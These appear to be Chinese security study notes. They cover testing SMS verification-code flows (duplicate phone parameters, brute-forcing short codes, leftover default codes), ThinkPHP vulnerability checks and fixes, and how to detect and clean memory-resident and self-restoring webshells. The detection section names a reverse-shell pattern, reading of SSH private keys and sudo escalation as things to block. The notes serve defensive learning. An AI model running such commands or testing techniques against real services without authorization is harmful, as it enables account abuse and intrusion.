    发送验证码时拦截数据包添加多个手机号参数看多个手机号是否会收到同一个验证码（邮箱同理）
    GET：参数?phone=电话号码1，电话号码2
  
            ?phone=电话号码1&phone=电话号码2
  
    POST：
  
        phone=号码1&phone=号码2
        JSON格式
            {
            "phone"="电话号码",
            "phone"="电话号码2",
            }

- 短信内容可修改，例如直接将要发送的内容显示再POST请求体里，但这里应该是直接后端发送走不应该显示的

- 验证码爆破（4位概率高）

- 默认验证码漏洞，开发者为了方便测试留下了默认验证码导致可以直接使用。

## thinkphp

ThinkPHP 历史漏洞比较多，常见问题主要集中在路由解析、请求参数处理、控制器方法调用、SQL 参数拼接以及多语言文件加载等位置。面对 ThinkPHP 目标时，我会先通过路由形式、错误页面、响应头和静态资源等信息判断框架类型，再进一步确认具体版本，并结合强制路由、调试模式、多语言功能等配置判断漏洞是否具备触发条件。

在授权或靶场环境中，我会优先采用低影响方式进行验证，确认漏洞现象后，结合请求响应、日志和补丁代码分析漏洞根因，而不是只依赖工具结果。修复方面，重点是升级到官方修复版本、关闭 DEBUG、限制动态控制器和方法调用、使用参数化查询，并通过白名单限制文件访问路径。修复完成后，还需要重新验证漏洞是否已经失效。

## 内存马

内存马（Memory Webshell），又称无文件马（Fileless Webshell），是一种直接运行在服务器内存中、无需在磁盘上写入实体文件的恶意后门程序。

- **无文件落地**：磁盘上没有对应的脚本文件，传统的文件查杀和防篡改监控很难发现它。
- **隐蔽性高**：利用应用程序或中间件（如 Tomcat、Java 进程等）的运行时内存来注册路由、过滤器或监听器，直接处理请求。
- **生命周期随服务**：一旦服务器重启，内存马通常就会失效并消失（除非配合其他持久化手段）。

**防护**
    emm，这让我想到了今年非常火的各种ai编程智能体例如Claude code，当不正当的使用ai编程智能体时他执行的危险操作在我看来就是内存马，具备直接运行在内存中，无文件落地，借ai智能体的身份掩饰具有高隐蔽性，ai智能体终端危险命令也被中断。防护的化可以借鉴这些agent的机制一旦检测到执行的操作具有危害性就向使用者抛出一个请求授权，同样的内存马寄生的各种进程也可以用此类机制监测，应该有这种专门监测进程的应用，当内存马尝试执行高危系统命令就进行告警或者阻断。
**监测**

- **高危指令匹配：** 针对反弹 Shell（如 `bash -i >& /dev/tcp/...`）、读取敏感文件（如 `~/.ssh/id_rsa`）或提权命令（如 `sudo`）建立拦截策略。
  
  ## 不死马

**不死马**是安全领域的俗称，通常指具备**自我恢复或持续驻留能力的 WebShell/后门**。

它的特点是：

- 删除 WebShell 文件后，过一段时间又重新出现；
- Web 服务重启后仍可能恢复；
- 可能依赖后台进程、计划任务、启动项、其他隐藏文件、数据库记录或漏洞反复写入；
- “不死”并不是永远无法清除，而是说明攻击者建立了持久化机制。

**监测**
    监测不死马要结合文件、进程、网络和日志进行关联分析。文件层面关注 Web 目录中的异常新增、修改以及删除后重现的文件，并通过审计机制定位创建者；进程层面关注 Web 服务派生 Shell、访问临时目录和异常外连；日志层面关注隐藏脚本访问、异常参数和重复请求。对于内存马，还要检查 Web 容器的运行时组件和加载类。发现异常后先保留证据并隔离主机，再清除持久化机制、修复初始入口，必要时重建服务器并进行复测。